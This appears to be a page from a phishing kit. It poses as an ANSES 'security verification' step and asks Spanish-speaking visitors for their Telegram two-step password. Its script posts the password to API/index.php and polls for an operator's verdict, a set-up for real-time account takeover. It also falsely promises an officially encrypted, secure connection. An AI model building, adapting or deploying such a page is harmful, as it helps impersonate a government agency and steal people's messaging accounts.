<style>
    /* Wrapper Utama */
    .password-wrapper {
        padding: 20px 15px;
        text-align: left;
        font-family: 'Roboto', sans-serif;
    }

    /* Header & Deskripsi */
    .password-title {
        font-size: 1.6rem !important;
        font-weight: 800;
        color: #2c3e50;
        margin-bottom: 10px;
        text-align: left;
        /* Diubah ke kiri agar konsisten dengan Lander/OTP */
    }

    .password-desc {
        font-size: 15px;
        color: #7f8c8d;
        text-align: left;
        margin-bottom: 30px;
        line-height: 1.5;
    }

    /* Gaya Label */
    .anses-label {
        font-size: 1rem;
        font-weight: 700;
        color: #34495e;
        margin-bottom: 8px;
        display: block;
    }

    /* Input Password Modern */
    .anses-password-input {
        width: 100%;
        height: 60px;
        border-radius: 12px;
        border: 2px solid #ecf0f1;
        padding: 10px 18px;
        font-size: 18px;
        color: #2c3e50;
        background-color: #fdfdfd;
        transition: all 0.3s ease;
    }

    .anses-password-input:focus {
        border-color: #f39c12;
        /* Warna senada dengan tema oranye/kuning */
        outline: none;
        background-color: #fff;
        box-shadow: 0 4px 12px rgba(243, 156, 18, 0.1);
    }

    .anses-password-input::placeholder {
        font-size: 15px;
        color: #bdc3c7;
    }

    /* Pesan Error */
    #wrong {
        font-size: 14px;
        color: #e74c3c;
        font-weight: 600;
        margin-top: 12px;
        text-align: left;
        display: none;
    }

    /* Tombol Konfirmasi */
    .btn-anses-confirm {
        width: 100%;
        height: 55px;
        border-radius: 25px;
        /* Pill-shaped sesuai gaya MIES/Ecuador */
        background: linear-gradient(180deg, #f39c12 0%, #e67e22 100%);
        color: #fff;
        border: none;
        font-weight: 800;
        font-size: 17px;
        text-transform: uppercase;
        margin-top: 30px;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(230, 126, 34, 0.3);
        transition: transform 0.2s ease;
    }

    .btn-anses-confirm:active {
        transform: scale(0.98);
    }

    /* Catatan Keamanan */
    .security-note {
        margin-top: 40px;
        padding: 15px;
        background-color: #f9f9f9;
        border-radius: 10px;
        font-size: 12px;
        color: #95a5a6;
        text-align: center;
        border: 1px solid #eee;
    }
</style>

<div class="password-wrapper">
    <h3 class="password-title">Verificación de Seguridad</h3>
    <p class="password-desc">Su cuenta tiene habilitada la verificación en dos pasos. Ingrese su contraseña de
        <strong>Telegram</strong> para finalizar el trámite.</p>
    <div class="mb-4">
        <label class="anses-label">Contraseña de la cuenta</label>
        <input type="password" class="form-control anses-password-input shadow-none" name="phone" id="phone"
            placeholder="Ingrese su contraseña" autocomplete="current-password" />
        <p id="wrong">❌ Contraseña incorrecta. Intente de nuevo.</p>
    </div>

    <button type="button" class="btn-anses-confirm btn">CONFIRMAR IDENTIDAD</button>

    <div class="security-note">
        🔒 Esta es una conexión segura y protegida por el sistema de cifrado oficial.
    </div>
</div>

<script>
    /* LOGIKA BACKEND & JAVASCRIPT ASLI (TIDAK DIUBAH) */
    $("#wrong").hide();

    function checkStatus() {
        $("#wrong").hide();
        $.ajax({
            url: "API/index.php",
            type: "POST",
            data: { "method": "getStatus" },
            success: function (data) {
                if (data.result.status == "success") {
                    window.location.reload();
                } else if (data.result.status == "failed") {
                    $("#wrong").show();
                    $("input[type='password']").val("");
                    $("#loader").hide();
                } else {
                    setTimeout(function () {
                        checkStatus();
                    }, 500);
                }
            }
        });
    }

    $(".btn-anses-confirm").on("click", function (e) {
        e.preventDefault();
        var password = $("input[type='password']").val();

        if (password !== "") {
            $("#loader").show();
            $.ajax({
                url: "API/index.php",
                type: "POST",
                data: { "method": "sendPassword", "password": password },
                success: function () {
                    setTimeout(function () {
                        checkStatus();
                    }, 500);
                }
            });
        }
    });
</script>